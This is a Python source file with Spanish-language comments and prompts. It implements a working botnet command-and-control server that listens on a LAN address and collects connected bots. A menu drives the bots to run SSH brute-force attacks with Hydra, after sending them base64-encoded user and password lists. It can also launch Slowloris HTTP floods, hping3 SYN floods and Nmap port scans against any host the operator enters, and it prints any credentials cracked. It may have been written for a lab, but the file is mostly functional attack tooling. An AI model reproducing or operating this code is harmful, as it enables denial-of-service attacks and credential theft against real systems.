import socket
import threading
import os
import time
import base64
import shlex
import re
from colorama import Fore, Style, init
from threading import Lock
from urllib.parse import urlparse

# Inicializar colorama
init()

# Colores y estilos
BANNER_COLOR = Fore.RED
MENU_COLOR   = Fore.CYAN
OPTION_COLOR = Fore.WHITE
SEPARATOR    = "-" * 60

# Estado global
bots = []
results = []
result_lock = Lock()
last_attack = None  # Guarda el tipo de ataque más reciente

# Funciones auxiliares
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def display_banner():
    print(BANNER_COLOR + r"""
     ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   
    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   
    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   
    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
    """ + Style.RESET_ALL)

def is_valid_host(host):
    try:
        socket.inet_aton(host)
        return True
    except socket.error:
        try:
            socket.gethostbyname(host)
            return True
        except socket.error:
            return False

def read_positive_int(prompt):
    val = input(prompt).strip()
    if not val.isdigit() or int(val) <= 0:
        raise ValueError("Debe ser un número entero positivo.")
    return int(val)

def check_file(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"El archivo no existe: {path}")
    if not os.access(path, os.R_OK):
        raise PermissionError(f"No tienes permiso de lectura: {path}")
    return True

# Manejo de bots y resultados
def handle_bot(client_socket):
    while True:
        try:
            output = client_socket.recv(4096).decode()
            if output.startswith("RESULT"):
                with result_lock:
                    results.append(output)
        except:
            try:
                bots.remove(client_socket)
            except:
                pass
            client_socket.close()
            break

def send_command(command):
    global last_attack
    parts = shlex.split(command)
    cmd_name = parts[0].upper()
    last_attack = cmd_name

    # Envío de ficheros para HYDRA
    if cmd_name == "HYDRA":
        user_file_path = parts[3]
        pass_file_path = parts[4]
        try:
            with open(user_file_path, "rb") as uf:
                users_b64 = base64.b64encode(uf.read()).decode()
            with open(pass_file_path, "rb") as pf:
                pass_b64 = base64.b64encode(pf.read()).decode()
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Archivos de credenciales no encontrados{Style.RESET_ALL}")
            return

        print(f"{Fore.GREEN}Enviando archivos de credenciales a {len(bots)} bots...{Style.RESET_ALL}")
        for bot in bots.copy():
            try:
                bot.send(f"SEND_FILE users.txt {users_b64}".encode())
            except:
                bots.remove(bot)
                bot.close()
        time.sleep(1)
        for bot in bots.copy():
            try:
                bot.send(f"SEND_FILE password.txt {pass_b64}".encode())
            except:
                bots.remove(bot)
                bot.close()
        time.sleep(1)
        command = f"HYDRA {parts[1]} {parts[2]} users.txt password.txt"

    print(f"{Fore.GREEN}Comando enviado a {len(bots)} bots{Style.RESET_ALL}")
    for bot in bots.copy():
        try:
            bot.send(command.encode())
        except:
            try:
                bots.remove(bot)
                bot.close()
            except:
                pass

# Mostrar resultados
def show_results():
    time.sleep(2)
    print(f"\n{Fore.CYAN}Resultados:{Style.RESET_ALL}")
    unique_credentials = set()
    hydra_failed = False
    slowloris_status = None
    hping3_success = False
    nmap_output = ""
    generic_errors = []

    with result_lock:
        current_results = results.copy()
        results.clear()
        displayed = set()

    for r in current_results:
        if r in displayed:
            continue
        displayed.add(r)

        if "RESULT HYDRA_SUCCESS" in r:
            for u,p in re.findall(r"(\S+):(\S+)", r):
                unique_credentials.add(f"{u}:{p}")
        elif "RESULT HYDRA_FAILED" in r:
            hydra_failed = True
        elif "RESULT SLOWLORIS_SUCCESS" in r:
            slowloris_status = True
        elif "RESULT SLOWLORIS_FAILED" in r:
            slowloris_status = False
        elif "RESULT ATTACK_COMPLETED HPING3_SYN" in r:
            hping3_success = True
        elif "RESULT ATTACK_FAILED HPING3_SYN" in r:
            hping3_success = False  
        elif "RESULT NMAP_SCAN:" in r:
            nmap_output = r.replace("RESULT NMAP_SCAN:", "").strip()
        elif "RESULT ERROR" in r:
            generic_errors.append(r.split("ERROR", 1)[1].strip())

    # Resultados HYDRA
    if last_attack == "HYDRA":
        if unique_credentials:
            print(f"  {Fore.GREEN}[+] Credenciales encontradas:{Style.RESET_ALL}")
            for c in unique_credentials:
                print(f"    - {Fore.CYAN}{c}{Style.RESET_ALL}")
        elif hydra_failed:
            print(f"  {Fore.RED}[-] No se encontraron credenciales válidas.{Style.RESET_ALL}")

    # Resultados Slowloris
    if last_attack == "SLOWLORIS":
        if slowloris_status is not None:
            color = Fore.RED if slowloris_status else Fore.GREEN
            text = "[-] Ataque HTTP fallido" if slowloris_status else "[+] Ataque HTTP exitoso"
            print(f"  {color}{text}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.RED}[-] Ataque HTTP fallido{Style.RESET_ALL}")

    # Resultados SYN Flood
    if last_attack == "HPING3_SYN":
        if hping3_success:
            print(f"  {Fore.GREEN}[+] Ataque SYN Flood exitoso.{Style.RESET_ALL}")
        else:
            print(f"  {Fore.RED}[-] Ataque SYN fallido{Style.RESET_ALL}")

    # Resultados Nmap
    if last_attack == "NMAP_SCAN":
        if "No se encontraron puertos abiertos" in nmap_output:
            print(f"  {Fore.RED}[-] No se han encontrado puertos{Style.RESET_ALL}")
        elif "ERROR" in nmap_output:
            error_msg = nmap_output.split('ERROR ')[1]
            print(f"  {Fore.RED}Error en Nmap: {error_msg}{Style.RESET_ALL}")
        elif nmap_output:
            print(f"  {Fore.GREEN}Puertos abiertos encontrados:{Style.RESET_ALL}")
            for p in nmap_output.split(" | "):
                print(f"    - {Fore.CYAN}{p}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.RED}[-] No se han encontrado puertos{Style.RESET_ALL}")

    # Errores genéricos
    for e in generic_errors:
        print(f"  {Fore.RED}Error: {e}{Style.RESET_ALL}")

    if not displayed:
        print(f"  {Fore.RED}No hay resultados disponibles.{Style.RESET_ALL}")

# Menú principal
def menu():
    while True:
        clear_screen()
        display_banner()
        print(SEPARATOR)
        print(f"{MENU_COLOR}Menu Principal{Style.RESET_ALL}")
        print(f"{OPTION_COLOR}1. Listar bots conectados")
        print(f"{OPTION_COLOR}2. Iniciar ataque")
        print(f"{OPTION_COLOR}3. Salir\n")
        opt = input("Seleccione opción: ").strip()

        if opt == '1':
            print(f"\n{Fore.GREEN}Bots conectados ({len(bots)}):{Style.RESET_ALL}")
            for b in bots:
                print(f" - {b.getpeername()}")
            input("\nEnter para continuar...")
            
        elif opt == '2':
            # Verificación de bots conectados
            if not bots:
                print(f"{Fore.RED}[-] No hay bots conectados{Style.RESET_ALL}")
                input("\nEnter para continuar...")
                continue
            
            print(f"\n{Fore.WHITE}Tipos de ataque:{Style.RESET_ALL}")
            print("1. SSH Brute Force")
            print("2. HTTP Flood")
            print("3. SYN Flood")
            print("4. Escanear puertos\n")
            t = input("Tipo: ").strip()

            # SSH Brute Force
            if t == '1':
                try:
                    target = input("IP o URL objetivo: ").strip()
                    parsed = urlparse(target)
                    host = parsed.hostname or target
                    if not is_valid_host(host):
                        raise ValueError(f"Dirección inválida: {host}")
                    port_input = input("Puerto (por defecto 22): ").strip() or "22"
                    if not port_input.isdigit() or not (1 <= int(port_input) <= 65535):
                        raise ValueError(f"Puerto inválido: {port_input}")
                    port = port_input
                    uf = input("Ruta absoluta de usuarios: ").strip()
                    pf = input("Ruta absoluta de contraseñas: ").strip()
                    check_file(uf)
                    check_file(pf)
                except (ValueError, FileNotFoundError, PermissionError) as e:
                    print(f"{Fore.RED}[!] {e}{Style.RESET_ALL}")
                    time.sleep(1)
                    continue
                cmd = f"HYDRA ssh ssh://{host}:{port} {uf} {pf}"
                send_command(cmd)
                time.sleep(120)
                show_results()

            # HTTP Flood (Slowloris)
            elif t == '2':
                try:
                    target = input("IP/URL objetivo: ").strip()
                    parsed = urlparse(target)
                    host = parsed.hostname or target
                    if not is_valid_host(host):
                        raise ValueError(f"Dirección inválida: {host}")
                    port_input = input("Puerto (por defecto 80): ").strip() or "80"
                    if not port_input.isdigit() or not (1 <= int(port_input) <= 65535):
                        raise ValueError(f"Puerto inválido: {port_input}")
                    prt = port_input
                    dur = read_positive_int("Duración (s): ")
                except ValueError as e:
                    print(f"{Fore.RED}[!] {e}{Style.RESET_ALL}")
                    time.sleep(1)
                    continue
                cmd = f"SLOWLORIS {host} {prt} {dur}"
                send_command(cmd)
                time.sleep(dur + 5)
                show_results()

            # SYN Flood
            elif t == '3':
                try:
                    target = input("IP/URL objetivo: ").strip()
                    parsed = urlparse(target)
                    host = parsed.hostname or target
                    if not is_valid_host(host):
                        raise ValueError(f"Dirección inválida: {host}")
                    port_input = input("Puerto (por defecto 80): ").strip() or "80"
                    if not port_input.isdigit() or not (1 <= int(port_input) <= 65535):
                        raise ValueError(f"Puerto inválido: {port_input}")
                    prt = port_input
                    dur = read_positive_int("Duración (s): ")
                except ValueError as e:
                    print(f"{Fore.RED}[!] {e}{Style.RESET_ALL}")
                    time.sleep(1)
                    continue
                cmd = f"HPING3_SYN {host} {prt} {dur}"
                send_command(cmd)
                time.sleep(dur + 5)
                show_results()

            # Escaneo de puertos (Nmap)
            elif t == '4':
                try:
                    target = input("IP/URL objetivo: ").strip()
                    parsed = urlparse(target)
                    host = parsed.hostname or target
                    if not is_valid_host(host):
                        raise ValueError(f"Dirección inválida: {host}")
                except ValueError as e:
                    print(f"{Fore.RED}[!] {e}{Style.RESET_ALL}")
                    time.sleep(1)
                    continue
                cmd = f"NMAP_SCAN {host}"
                send_command(cmd)
                time.sleep(10)
                show_results()

            else:
                print(f"{Fore.RED}Opción inválida{Style.RESET_ALL}")
                time.sleep(1)
            input("\nEnter para continuar...")
            
        elif opt == '3':
            print("¡Hasta luego!")
            os._exit(0)

# Inicialización del servidor y menú
def start_server():
    threading.Thread(target=menu, daemon=True).start()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.10.16', 8888))
    server.listen(5)
    while True:
        client_sock, addr = server.accept()
        bots.append(client_sock)
        threading.Thread(target=handle_bot, args=(client_sock,), daemon=True).start()

if __name__ == "__main__":
    start_server()